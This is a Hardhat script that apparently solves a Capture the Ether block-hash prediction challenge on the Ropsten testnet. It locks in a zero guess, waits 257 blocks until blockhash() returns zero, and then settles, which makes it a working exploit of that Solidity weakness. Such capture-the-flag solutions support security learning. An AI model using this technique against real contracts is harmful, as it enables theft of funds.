const { ethers } = require("hardhat");

async function main() {
    //The contract abi
    const abi =  [
        { "constant": false, "inputs": [], "name": "settle", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" },
        { "constant": true, "inputs": [], "name": "isComplete", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" },
        { "constant": false, "inputs": [{ "name": "hash", "type": "bytes32" }], "name": "lockInGuess", "outputs": [], "payable": true, "stateMutability": "payable", "type": "function" },
        { "inputs": [], "payable": true, "stateMutability": "payable", "type": "constructor" }
    ];

    //The contract address - Just copy it from the CTE challenge page
    const contractAddress = "0x6B863cDa216C9324F9C92411fB33fB9a0e8e3C9C";
    
    /* 
    * To solve the challenge, you neeed to use your ropsten account, as CTE is expecting that account address.
    * To that effect, you need to export your private key from metamask and place it in the hardhat.config.js - the template is already there.
    * Then, we can get your wallet as the signer. The console.log should print your ropsten account address.
    */
    const [signer] = await ethers.getSigners();
    console.log("SIGNER: ", signer.address)

    //Get the contract and connect using your account
    var cteContract = new ethers.Contract(contractAddress, abi, signer);

    //Lock your guess - Guess 0
    let tx = await cteContract.lockInGuess(ethers.utils.formatBytes32String(""), {value: ethers.utils.parseEther("1")});
    console.log("LOCK GUESS TRANSACTION HASH: ", tx.hash);

    //Wait for the transaction to be mined so we can get the receipt
    let txReceipt = await tx.wait();
    console.log("TRANSACTION RECEIPT", txReceipt);

    //Make a loop that waits 257 blocks before settling
    let lockGuessBlockNumber = txReceipt.blockNumber;
    let currentBlockNumber = txReceipt.blockNumber;
    console.log("LOCK GUESS BLOCK NUMBER", lockGuessBlockNumber);

    do {
        let previousBlockNumber = currentBlockNumber;
        currentBlockNumber = await ethers.provider.getBlockNumber();
        if (previousBlockNumber !== currentBlockNumber) {
            console.log("CURRENT BLOCK NUMBER", currentBlockNumber);
            console.log("----------------------------------------");
        }
    }
    while (lockGuessBlockNumber + 257 >= currentBlockNumber);

    //Settle your guess and get your ETH back
    let settleTx = await cteContract.settle();
    console.log("SETTLE TX", settleTx);
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error);
        process.exit(1);
    });